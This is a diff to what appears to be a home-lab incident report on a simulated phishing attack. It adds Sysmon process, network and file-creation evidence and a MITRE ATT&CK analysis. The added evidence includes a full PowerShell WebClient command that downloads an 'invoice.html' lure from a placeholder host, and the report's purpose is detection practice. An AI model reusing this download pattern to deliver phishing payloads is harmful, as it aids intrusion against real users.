@@ -20,22 +20,21 @@ endpoint.
 
 ## Evidence
 ## Event ID 1 — Process Creation
-Image: 
-CommandLine: 
+Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
+CommandLine: powershell.exe -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object Net.WebClient).DownloadFile('http://example.com', '$env:USERPROFILE\Documents\Phishing_Test\invoice.html')"
+User: DESKTOP-NJTJAHZ\windows11
 
 ## Event ID 3 — Network Connection
-•	Image: powershell.exe
-•	DestinationHostname: example.com
-•	DestinationPort: 443
-•	Protocol: tcp
+Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
+DestinationHostname: example.com
+DestinationPort: 80
+Protocol: HTTP
 
 ## Event ID 11 — File Creation
-•	Image: powershell.exe
-•	TargetFilename:'invoice.html'
-•	File location user folders – phishing indicator
+Image: C:\\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
+TargetFilename:C:\\Users\windows11\Appdata\Local\Temp\__PSScriptPolicyTest_rc5tv5x1.dxt.ps1
 
 ## MITRE ATT&CK Analysis
-
 ### T1566 – Phishing (Initial Access)
 Intial access  was simulated as a phishing email containing an
 invoice themed attachment. User interaction with the attachment represents
@@ -72,6 +71,6 @@ techniques.
 ## Lessons Learned
 This incident highlights the importance of monitoring scripting engines
 such as PowerShell and correlating process execution with network activity
-and file creation to effectivly detect phishing based payload delivery.
+and file creation to effectively detect phishing based payload delivery.
 
 
